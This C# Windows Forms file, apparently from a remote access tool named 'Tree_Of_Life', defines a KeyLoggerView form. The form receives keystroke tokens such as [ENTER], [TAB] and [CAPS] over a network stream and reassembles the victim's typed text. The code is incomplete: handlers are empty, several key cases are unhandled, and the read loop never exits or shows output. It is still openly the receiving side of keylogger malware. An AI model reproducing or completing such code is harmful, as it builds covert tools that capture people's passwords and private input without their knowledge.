using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;

namespace Tree_Of_Life
{
    public partial class KeyLoggerView : Form
    {
        private StreamReader reader;
        private StreamWriter writer;
        private StringBuilder builder = new StringBuilder();

        public KeyLoggerView(NetworkStream stream)
        {
            InitializeComponent();
            reader = new StreamReader(stream);
            writer = new StreamWriter(stream);
        }

        private void Kill_Click(object sender, EventArgs e)
        {

        }

        private void KeyLoggerView_Shown(object sender, EventArgs e)
        {

        }

        private void ReadKeys()
        {
            while (true)
            {
                string keys = reader.ReadLine();
                switch ((string)keys)
                {
                    case "[ENTER]":
                        builder.Append("\n");
                        break;
                    case "[TAB]":
                        builder.Append("    ");
                        break;
                    case "[CAPS]"://Enable Caps Lock
                        break;
                    case @"[\CAPS]"://Disable Caps Lock
                        break;
                    case "[CAP]"://Shift Key Down
                        break;
                    case @"[\CAP]"://Shift Key Up
                        break;
                    case "[BACK]":
                        break;
                    case "[DEL]"://Delete Key
                        break;
                }
            }
        }
    }
}
